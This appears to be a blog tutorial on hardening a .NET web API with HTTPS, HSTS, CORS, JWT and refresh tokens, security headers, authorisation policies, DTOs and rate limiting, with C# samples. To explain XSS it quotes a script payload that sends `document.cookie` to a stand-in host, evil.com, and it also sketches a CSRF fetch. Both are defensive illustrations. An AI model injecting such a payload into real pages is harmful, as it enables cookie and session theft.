# .NET API Security Complete Guide : HTTPS to JWT to Rate Limiting

Letâ€™s imagine we have a simple webshop. Itâ€™s new and shiny, we just built amazing APIs that returns our products. Sounds great, now we have two problems.

Read this story for free.

**Problem 1: Anyone can call our API** â†’ No authentication = competitors can scrape prices, bots can spam requests.

How about some security?  

**Problem 2: Data travels in plain text (HTTP)** â†’ Hackers on network can see everything users do.

Weâ€™ll solve Problem 2 FIRST because:
- Even if we add authentication, **passwords would travel unencrypted!**

You can find the whole .NET Solution used in the blog on this repo:  
[GitHub - Gabegi/.net_api_security_authentication_authorisation](https://github.com/Gabegi/.net_api_security_authentication_authorisation)

As always if you find anything wrong or a better way of doing things, just drop a comment.

### Hereâ€™s what we are going to cover:

**1/ Foundation: Transport and browser security**
- HTTPS
- HSTS
- CORS

**2/ Identity (Who are you?)**
- JWT
- Refresh token
- Security headers
- API Keys

**3/ Authorisation (What are you allowed to do?)**
- Authorisation policies
- Endpoint annotations

**4/ Data protection and sanitation**
- DTOs (prevent mass assignment & data leaks)
- Encryption at rest
- Rate limiting
- Error handling middleware
- Client IP tracking

---

## 1/ Foundation: Data transport and browser security
Is my data in transit safe?

### 1.1 HTTPS
HTTPS is foundation for all other security. Why? Letâ€™s see:

```text
// Difference between HTTP and HTTPS
HTTP  (plain text)
Client: "GET /api/products"
Hacker: ğŸ‘€ "I can see everything!"

HTTPS (encrypted)
Client: "aGVsbG8gd29ybGQ=" (encrypted)
Hacker: ğŸ¤· "Just gibberish"
```

When using HTTP, anyone on the network (coffee shop WiFi, ISP, etc.) can:
- See what users are buying
- Read user emails
- Intercept data

So imagine if we had authentication, but not HTTPS:
```text
POST /api/auth/login
{
  "email": "alice@example.com",
  "password": "SecurePass123"
}

Hacker on network: ğŸ‘€ "Oh cool, I have Alice's password now!"
```

HTTPS is the foundation â€” it protects:
- Passwords during login
- JWT tokens in headers
- API keys
- All response data

#### ğŸ” So what is HTTPS?
**HTTP vs HTTPS â€” The Core Difference**
HTTP  = HyperText Transfer Protocol  
HTTPS = HyperText Transfer Protocol Secure  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;â†‘  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The 'S' = SSL/TLS encryption

#### How HTTPS Works (The Handshake)
**Step 1: Client Hello**
```text
Browser                                              Server
   â”‚                                                     â”‚
   â”‚  "Hi! I want secure connection"                     â”‚
   â”‚  "I support these encryption methods:"            â”‚
   â”‚  - TLS 1.3                                        â”‚
   â”‚  - AES-256                                        â”‚
   â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€>â”‚
```

**Step 2: Server Hello + Certificate**
```text
Browser                                              Server
   â”‚                                                    â”‚
   â”‚  "OK! Here's my identity certificate"             â”‚
   â”‚  "Let's use TLS 1.3 + AES-256"                   â”‚
   â”‚                                                    â”‚
   â”‚  Certificate contains:                            â”‚
   â”‚  - Server's public key                            â”‚
   â”‚  - Domain: example.com                            â”‚
   â”‚  - Signed by: Let's Encrypt                       â”‚
   â”‚<â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚
```

**Step 3: Browser Verifies Certificate**
```text
Browser checks:
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Is certificate valid?           â”‚
â”‚ âœ“ Not expired                   â”‚
â”‚ âœ“ Domain matches (example.com)  â”‚
â”‚ âœ“ Signed by trusted CA          â”‚
â”‚   (Let's Encrypt, DigiCert...)  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```
**Whatâ€™s a Certificate Authority (CA)?** A trusted authority that verifies server identity.

**Step 4: Generate Shared Secret**
```text
Browser                                              Server
   â”‚                                                    â”‚
   â”‚  Browser generates random key                     â”‚
   â”‚  Encrypts it with server's PUBLIC key             â”‚
   â”‚  (only server can decrypt with PRIVATE key)       â”‚
   â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€>â”‚
   â”‚                                                    â”‚
   â”‚                  Server decrypts with PRIVATE key â”‚
   â”‚                                                    â”‚
```
Now both have the **SAME SECRET KEY** (symmetric key).

**Step 5: Secure Communication**
```text
Browser                                              Server
   â”‚                                                    â”‚
   â”‚  All data encrypted with shared secret           â”‚
   â”‚  "GET /api/products" â†’ "aGVsbG8="               â”‚
   â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€>â”‚
   â”‚                                                    â”‚
   â”‚  Server decrypts with shared secret              â”‚
   â”‚  Processes request                               â”‚
   â”‚  Encrypts response                               â”‚
   â”‚<â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚
   â”‚  "ZGF0YQ==" â†’ "Products: [...]"                 â”‚
```

#### ğŸ” Encryption Types Used
**Phase 1: ASYMMETRIC (Public/Private Key)**
â””â”€ Used ONLY for initial handshake  
â””â”€ Slow but secure for exchanging shared secret  

**Phase 2: SYMMETRIC (Shared Secret)**
â””â”€ Used for ALL actual data  
â””â”€ Fast encryption/decryption  

#### HTTPS Implementation
The good News: HTTPS is already built-In in .NET APIs! Check your `launchSettings.json`:
```json
"applicationUrl": "https://localhost:7001;http://localhost:5000",
```
However, HTTP is still available as an option. What we want is that HTTPS is **ALWAYS** being used. Add this to `Program.cs`:

```csharp
// ====== HTTPS CONFIGURATION ======

// 1. HTTPS Redirection (redirect HTTP â†’ HTTPS)
builder.Services.AddHttpsRedirection(options =>
{
    options.RedirectStatusCode = StatusCodes.Status307TemporaryRedirect;
    options.HttpsPort = 7001; // Your HTTPS port from launchSettings
});

// 2. HSTS (HTTP Strict Transport Security)
// Forces browsers to ALWAYS use HTTPS for your domain
builder.Services.AddHsts(options =>
{
    options.MaxAge = TimeSpan.FromDays(365);        // Remember for 1 year
    options.IncludeSubDomains = true;               // Apply to all subdomains
    options.Preload = true;                         // Submit to browser preload list
});

var app = builder.Build();

// ====== MIDDLEWARE PIPELINE ======

// Only use HSTS in production (not localhost)
if (!app.Environment.IsDevelopment())
{
    app.UseHsts();
}

// Redirect HTTP â†’ HTTPS
app.UseHttpsRedirection();
```

**What happens now?**
**Before (No HTTPS redirect):**
User visits: `http://localhost:5000/api/products` â†’ Returns data over HTTP âŒ

**After (With HTTPS redirect):**
User visits: `http://localhost:5000/api/products`  
â†“  
307 Redirect to `https://localhost:7001/api/products`  
â†“  
Returns data over HTTPS âœ…

### 1.2 HSTS
#### ğŸ›¡ï¸ What is HSTS?
HTTP Strict Transport Security tells browsers: **ALWAYS use HTTPS for this domain, even if user types http://**

**Without HSTS:**
User types: `http://example.com` â†’ Browser: "Let me try HTTP first..." (vulnerable moment) â†’ Server: "Redirect to HTTPS" â†’ Browser: "OK, switching"

**With HSTS:**
User types: `http://example.com` â†’ Browser: "NOPE! I remember this site is HTTPS-only" (immediate, no HTTP request sent) â†’ Automatically goes to `https://example.com` âœ…

**Test your setup:**
`curl -I http://localhost:5000/api/products`

#### Summary
- HTTPS in .NET â€” out of the box!
- HTTPS redirection â€” forces HTTP â†’ HTTPS
- HSTS â€” tells browsers â€œHTTPS only, foreverâ€

### ğŸŒ 1.3 CORS (Cross-Origin Resource Sharing)
#### What Is CORS?
First letâ€™s understand what an origin is! This entire combo = **ONE origin**:
`https://myapp.com:443` (Protocol | Domain | Port)

**Same Origin (No CORS needed):**
- `https://myapp.com/page1`
- `https://myapp.com/api/products`
All same origin âœ…

**Different Origins (CORS needed):**
- `https://myapp.com â‰  http://myapp.com` (HTTP vs HTTPS)
- `https://myapp.com â‰  https://api.myapp.com` (Subdomain)
- `https://myapp.com:443 â‰  https://myapp.com:8080` (Port)
- `https://myapp.com â‰  https://other.com` (Domain)

#### Letâ€™s see why CORS is actually a security problem:
Imagine you have your browser open with two tabs:
1. One with your bank (logged in via cookies) ğŸ¦
2. One with an evil website ğŸ˜ˆ

Tab 2 runs malicious JavaScript: `fetch('https://bank.com/api/transfer', {...})`
Because cookies are saved, **without CORS**:
Browser thinks: "Request to bank.com? I have cookies for that!" *attaches cookies from Tab 1*. Bank receives authenticated request âŒ

**Browser shares cookies ACROSS ALL tabs/windows for same domain:**
```text
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚         BROWSER                     â”‚
â”‚                                     â”‚
â”‚  Tab 1: bank.com (cookie stored)   â”‚
â”‚  Tab 2: evil.com                    â”‚
â”‚                                     â”‚
â”‚  Cookie Jar ğŸª                      â”‚
â”‚  â””â”€ bank.com: session=abc123        â”‚
â”‚     â†‘                                â”‚
â”‚     â””â”€ Both tabs can trigger        â”‚
â”‚        requests with this cookie!   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```
This attack is called **CSRF = Cross-Site Request Forgery**.

#### Letâ€™s now see how CORS helps prevent it! ğŸ›¡ï¸
1. Browser sends request WITH cookie âœ…. `Origin: https://evil.com` added.
2. Bank receives request âœ… and processes it.
3. Bank sends response with header: `Access-Control-Allow-Origin: https://bank.com`.
4. Browser receives response âœ….
5. Browser checks CORS âš ï¸: "Response says ONLY bank.com allowed, but request came from evil.com. **Origin mismatch!**"
6. Browser **BLOCKS** JavaScript âŒ. Evil code never gets the data!

#### ğŸ¯ What Gets Blocked:
- âœ… Request is sent (with cookie)
- âœ… Bank processes it
- âœ… Response is sent
- âŒ JavaScript **CANNOT READ** the response

**âš ï¸ But action might still execute!** CORS doesnâ€™t prevent the ACTION, only reading the result is blocked. Money still stolen! ğŸ’¸

#### Full Protection Needs two things:
1. **CORS**
2. **CSRF Token** (Must match session, evil.com doesn't know this token)

#### Why do we need to disable CORS then?
Browser is **VERY strict** by default â€” it blocks everything apart from the data from the exact URL. You add CORS to loosen the restriction so your frontend can access your API.

#### Implementation
**Wait â€” Do You Even Need CORS?**
CORS is **ONLY** for browsers calling your API.
- No frontend â†’ No browser â†’ No CORS needed! âŒ
- Postman/curl/Mobile app/Swagger/Server API â†’ Doesn't need CORS!

**Add CORS to middleware:**
```csharp
using Microsoft.EntityFrameworkCore;
using SecureApi.Data;

var builder = WebApplication.CreateBuilder(args);

// Database
builder.Services.AddDbContext<ApplicationDbContext>(options =>
    options.UseSqlite("Data Source=secureapi.db"));

builder.Services.AddEndpointsApiExplorer();
builder.Services.AddSwaggerGen();

// ===== CORS CONFIGURATION =====
builder.Services.AddCors(options =>
{
    options.AddDefaultPolicy(policy =>
    {
        policy.WithOrigins(
                "https://myapp.com",           
                "https://www.myapp.com")       
            .WithMethods("GET", "POST", "PUT", "DELETE")
            .WithHeaders("Content-Type", "Authorization")
            .AllowCredentials();               
    });
});

var app = builder.Build();

app.UseHttpsRedirection();

// ===== CORS MIDDLEWARE =====
// Must be placed BEFORE UseAuthentication() and UseAuthorization()
app.UseCors();  

app.UseSwagger();
app.UseSwaggerUI();

// Endpoints
app.MapGet("/api/products", async (ApplicationDbContext db) =>
{
    var products = await db.Products.ToListAsync();
    return Results.Ok(products);
});

app.Run();
```

#### CSRF Token
Well, if you have JWT, you donâ€™t need it. So letâ€™s jump directly into the big gun.

---

## 2/ Identity (authentication)
Who are you?



### 2.1 JWT
#### What Is JWT (JSON Web Token)?
A JSON object to securely transmit information. Why do we need it? 

**Traditional User Session:**
User logs in â†’ Server creates session â†’ Stores in DB.  
â†“ Slow, stateful, doesn't scale well.

**Session-approach problems:**
ğŸŒ Slow â€” DB lookup on EVERY request  
ğŸ’¾ Stateful â€” Server must store sessions  
ğŸ”„ Doesnâ€™t scale â€” Hard to share sessions across servers  
ğŸ’° Expensive â€” Need Redis, etc.

**With JWT (stateless):**
User logs in â†’ Server creates JWT â†’ Gives to user. User stores JWT â†’ Sends with each request â†’ Server validates.  
â†“ Fast, stateless, scales easily!

**Login Flow with JWT:**
1. Validate credentials âœ….
2. Create JWT (NO DATABASE!): `{ "userId": "1", "role": "User" }`.
3. Sign with secret key.
4. Send `{ "token": "eyJ..." }` to user.
5. User sends `Authorization: Bearer eyJ...`.
6. Server verifies signature (NO DATABASE!) âš¡.



#### Benefits of JWT
- âš¡ **Fast** â€” No DB lookup. Signature verify (<1ms) is 10â€“50x faster.
- ğŸš€ **Stateless** â€” Server doesnâ€™t store anything. Independent validation! âœ¨
- ğŸ“ˆ **Scales** â€” Any server can validate.
- ğŸ’° **Cheap** â€” No session storage needed.
- **Self Contained** â€” User info is inside the token.
- **Cross-Domain** â€” Header goes anywhere. Perfect for microservices! ğŸš€
- **Mobile-Friendly** â€” Simple string vs complex cookie management.

#### âš ï¸ JWT Limitations
- Token Size (~500 bytes on EVERY request).
- Not encrypted (HTTPS needed).
- **Canâ€™t Revoke a Token** once issued! (If a user is fired, token is valid until it expires).
- **Remediation:** Short expiration (15â€“60 min) + Refresh tokens.

### 2.2 Refresh Tokens


**How they work:**
Refresh/revoke any token at any time! We use a short-lived token (memory) + refresh token (DB).
1. Login â†’ Get both tokens.
2. API calls â†’ Use access token (no DB check).
3. Token expires â†’ Use refresh token (DB check).
4. Get new access token â†’ Repeat.
5. Logout â†’ Delete refresh token from DB.



#### JWT Implementation
**ğŸ“¦ Step 1: Add Package**
`<PackageReference Include="Microsoft.AspNetCore.Authentication.JwtBearer" Version="9.0.0" />`

**Create endpoints:**
```csharp
public static class AuthEndpoints
{
    public static void MapAuthEndpoints(this WebApplication app)
    {
        var group = app.MapGroup("/api/auth").WithTags("Authentication");

        group.MapPost("/login", HandleLogin)
            .Produces<TokenResponse>(StatusCodes.Status200OK);

        group.MapPost("/refresh", HandleRefresh)
            .Produces<TokenResponse>(StatusCodes.Status200OK);

        group.MapPost("/logout", HandleLogout)
            .Produces(StatusCodes.Status200OK);
    }
}
```

**Token Service:**


```csharp
public class TokenService : ITokenService
{
    private const string DEFAULT_ROLE = "User";
    private readonly IConfiguration _configuration;
    private readonly ApplicationDbContext _context;

    public TokenService(IConfiguration configuration, ApplicationDbContext context)
    {
        _configuration = configuration;
        _context = context;
    }

    public string GenerateAccessToken(int userId, string email, string role)
    {
        var jwtSettings = _configuration.GetSection("Jwt");
        var secretKey = jwtSettings["SecretKey"] ?? throw new InvalidOperationException();
        var expiryMinutes = int.Parse(jwtSettings["AccessTokenExpiryMinutes"] ?? "15");

        var claims = new List<Claim>
        {
            new(JwtRegisteredClaimNames.Sub, userId.ToString()),
            new(JwtRegisteredClaimNames.Email, email),
            new(ClaimTypes.Role, role),
            new(JwtRegisteredClaimNames.Jti, Guid.NewGuid().ToString())
        };  

        var key = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(secretKey));
        var credentials = new SigningCredentials(key, SecurityAlgorithms.HmacSha256);

        var token = new JwtSecurityToken(
            issuer: jwtSettings["Issuer"],
            audience: jwtSettings["Audience"],
            claims: claims,
            expires: DateTime.UtcNow.AddMinutes(expiryMinutes),
            signingCredentials: credentials
        );

        return new JwtSecurityTokenHandler().WriteToken(token);
    }

    public RefreshToken GenerateRefreshToken(string ipAddress)
    {
        var jwtSettings = _configuration.GetSection("Jwt");
        var expiryDays = int.Parse(jwtSettings["RefreshTokenExpiryDays"] ?? "7");
        var randomBytes = new byte[64];
        using var rng = RandomNumberGenerator.Create();
        rng.GetBytes(randomBytes);

        return new RefreshToken
        {
            Token = Convert.ToBase64String(randomBytes),
            ExpiresAt = DateTime.UtcNow.AddDays(expiryDays),
            CreatedByIp = ipAddress
        };
    }

    public async Task<TokenResponse> RefreshTokenAsync(string token, string ipAddress)
    {
        var refreshToken = await _context.RefreshTokens.Include(rt => rt.User)
            .FirstOrDefaultAsync(rt => rt.Token == token);

        if (refreshToken == null || !refreshToken.IsActive)
            throw new UnauthorizedAccessException();

        refreshToken.RevokedAt = DateTime.UtcNow;
        var newAccessToken = GenerateAccessToken(refreshToken.User.Id, refreshToken.User.Email, refreshToken.User.Role ?? DEFAULT_ROLE);
        var newRefreshToken = GenerateRefreshToken(ipAddress);
        newRefreshToken.UserId = refreshToken.UserId;

        _context.RefreshTokens.Add(newRefreshToken);
        await _context.SaveChangesAsync();

        return new TokenResponse(newAccessToken, newRefreshToken.Token, 900);
    }

    public async Task RevokeTokenAsync(string token)
    {
        var refreshToken = await _context.RefreshTokens.FirstOrDefaultAsync(rt => rt.Token == token);
        if (refreshToken != null && refreshToken.IsActive)
        {
            refreshToken.RevokedAt = DateTime.UtcNow;
            await _context.SaveChangesAsync();
        }
    }
}
```

**In Program.cs:**
`app.UseAuthentication();` sets `User.Identity`. You can now extract info:
`var role = User.FindFirst(ClaimTypes.Role); // "Admin"`

#### Where JWT are stored
- **Database:** Refresh token.
- **Client:** Both tokens!



**Storage after login:**
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  SERVER (Database)                      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  RefreshTokens Table:                   â”‚
â”‚  â”œâ”€ Token: "abc123..."         âœ…       â”‚
â”‚  â””â”€ IsActive: true                      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  CLIENT (Browser/App)                   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  localStorage:                           â”‚
â”‚  â”œâ”€ accessToken: "eyJ..."      âœ…       â”‚
â”‚  â””â”€ refreshToken: "abc123..."  âœ…       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

**Client location:** Cookies (browsers only) or Headers (everyone).

[Image comparing Cookie storage vs Header storage for JWT tokens]

### 2.3 Security Headers
#### What Are Security Headers?
Without them, browser guesses. With them, browser follows strict rules: "No iframes, block inline scripts!"

#### How they keep JWT safe
**XSS (Cross-Site Scripting):** Attacker injects malicious JS. `<script>fetch('evil.com?cookie='+document.cookie)</script>` steals data.

**CSP (Content Security Policy) is a Header:**
`Content-Security-Policy: default-src 'self'; script-src 'self'`
- âœ… Scripts from yoursite.com â†’ Allowed
- âŒ Inline scripts â†’ BLOCKED
- âŒ Stealing `localStorage` token â†’ BLOCKED âœ…

#### Other attacks blocked:
- **MIME sniffing:** `X-Content-Type-Options: nosniff`.
- **Clickjacking:** `X-Frame-Options: DENY`.
- **Referrer-Policy:** `no-referrer` prevents sensitive URL leaking.

#### Implementation: Custom Middleware
```csharp
public class SecurityHeadersMiddleware
{
    private readonly RequestDelegate _next;
    public SecurityHeadersMiddleware(RequestDelegate next) => _next = next;

    public async Task InvokeAsync(HttpContext context)
    {
        context.Response.Headers.Remove("Server");
        var headers = context.Response.Headers;
        headers.Append("X-Content-Type-Options", "nosniff");
        headers.Append("X-Frame-Options", "DENY");
        headers.Append("Content-Security-Policy", "default-src 'self';");
        await _next(context);
    }
}
```

#### HttpOnly Cookies
If using cookies, enable `HttpOnly`: **JS cannot read the token!**
- Refresh token (HttpOnly cookie) â†’ XSS canâ€™t steal it âœ…
- Access token (in-memory) â†’ Cleared on close âœ…

### 2.4 API Keys
Long-lived tokens for service-to-service auth (e.g., Stripe, partners).



**Creation/Usage Flow:**
1. Generate sk_live_abc123. Save to DB.
2. Give sk to external service.
3. Service sends `X-API-Key: sk_live_abc123`.
4. Backend checks DB. âœ…

[Image comparing JWT features with API Key features]

**Implementation:**
Add `DbSet<ApiKey>` to Context. Create `ApiKeyMiddleware` to validate header against DB. Add to pipeline **AFTER** `UseAuthentication`.

---

## 3/ Authorisation
WHAT are you allowed to do?

`app.UseAuthorization();` checks `[Authorize]`, roles, and policies.
**âš ï¸ Order Matters!** AuthN (Who) must run before AuthZ (What).

### 3.1 Authorisation Policies
Tie roles to sets of permissions. Define once, use everywhere!

**Without policies:** Manual checks repeated in every endpoint ğŸ˜«.
**With policies:**
```csharp
builder.Services.AddAuthorization(options =>
{
    options.AddPolicy("AdminOnly", policy => policy.RequireRole("Admin"));
    options.AddPolicy("MustBeOver18", policy => policy.Requirements.Add(new MustBeOver18Requirement()));
});

// Usage
app.MapGet("/api/stats", () => { ... }).RequireAuthorization("AdminOnly");
```

### 3.2 Endpoint Annotations
- **RequireAuthorization:** Lock on your endpoint.
- **AllowAnonymous:** Open to anyone (Public endpoints).

[Image showing protected vs open API endpoints]

---

## 4/ Data protection and sanitation

### 4.1 DTOs (Data transfer objects)
Filter between Entity (Database) and Client.

**Problem 1: Security â€” Mass Assignment.** Attacker sends `"role": "Admin"` in JSON. Without DTO, they become admin ğŸ”¥.
**Problem 2: Data Exposure.** Don't leak `PasswordHash` in GET responses.
**Problem 3: API Breaking changes.** Entity changes shouldn't break the client contract.

### 4.2 Encryption at rest
Data states: In Transit (HTTPS), In Use (RAM), **At Rest (Disk)**.
**Solution: TDE (Transparent Data Encryption).** Disk data is gibberish without the key from Vault. Azure SQL has this on by default!

### 4.3 Rate Limiting
Prevents **Brute Force** and **DoS** attacks.
- Attempt 1-5: âœ… Allowed
- Attempt 6: âŒ 429 Too Many Requests

**Implementation:**
```csharp
builder.Services.AddRateLimiter(options =>
{
    options.AddFixedWindowLimiter("auth", opt =>
    {
        opt.PermitLimit = 5;
        opt.Window = TimeSpan.FromMinutes(1);
    });
});
app.UseRateLimiter();
```

### 4.4 Error Handling Middleware
Leaking stack traces reveals code structure and file paths âŒ.
**Solution:** Catch exceptions globally and return standardized `{ "error": "An error occurred", "statusCode": 500 }`.

#### Validation with Fluent validation
Protects against Injection, Buffer Overflows, and Enforces Business Rules (e.g., no self-transfers).

### 4.5 Client IP Tracking
Store `CreatedByIp` in `RefreshToken`.
- User home (USA) â†’ Russia IP refresh? ğŸš¨ **Security breach!** Block it ğŸ›¡ï¸.

**Security Benefits:**
1. Detect Compromised Tokens.
2. Audit Trail.
3. IP-based Access Control.

**GetClientIp Implementation:** Checks `X-Forwarded-For` (proxy) then `RemoteIpAddress`.

---

## Conclusion
All right, that was quite a few things to implement, if youâ€™re keen you can also check my other blog on **network security for apps in Azure**.